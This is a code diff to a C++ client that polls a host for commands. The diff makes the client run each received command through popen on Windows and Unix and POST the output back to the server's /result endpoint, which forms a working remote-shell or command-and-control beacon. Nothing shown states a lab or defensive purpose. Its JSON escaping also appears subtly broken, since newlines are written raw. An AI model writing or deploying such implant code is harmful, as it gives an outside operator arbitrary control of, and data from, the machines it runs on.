@@ -107,8 +107,38 @@ int main(int argc, char* argv[]) {
         }
         if (!command.empty()) {
             std::cout << "Command: " << command << std::endl;
-            std::string result = "received " + command;
-            std::string resBody = "{\"client_id\":\"" + client_id + "\",\"result\":\"" + result + "\"}";
+            std::string result;
+#ifdef _WIN32
+            FILE* pipe = _popen(command.c_str(), "r");
+#else
+            FILE* pipe = popen(command.c_str(), "r");
+#endif
+            if (pipe) {
+                char buf[256];
+                while (fgets(buf, sizeof(buf), pipe)) {
+                    result += buf;
+                }
+#ifdef _WIN32
+                _pclose(pipe);
+#else
+                pclose(pipe);
+#endif
+            }
+            if (result.empty()) result = "(no output)";
+            // escape backslashes and quotes for JSON
+            std::string esc;
+            for (char ch : result) {
+                if (ch == '\\' || ch == '"') esc += '\\';
+                if (ch == '\n') {
+                    esc += "\n";
+                } else if (ch == '\r') {
+                    continue;
+                } else {
+                    esc += ch;
+                }
+            }
+            std::string resBody = "{\"client_id\":\"" + client_id + "\",\"result\":\"" + esc + "\"}";
+
             std::string resReq = "POST /result HTTP/1.1\r\n";
             resReq += "Host: " + host + "\r\n";
             resReq += "Content-Type: application/json\r\n";
@@ -120,7 +150,6 @@ int main(int argc, char* argv[]) {
         Sleep(1000);
 #else
         sleep(1);
-
 #endif
     }
 
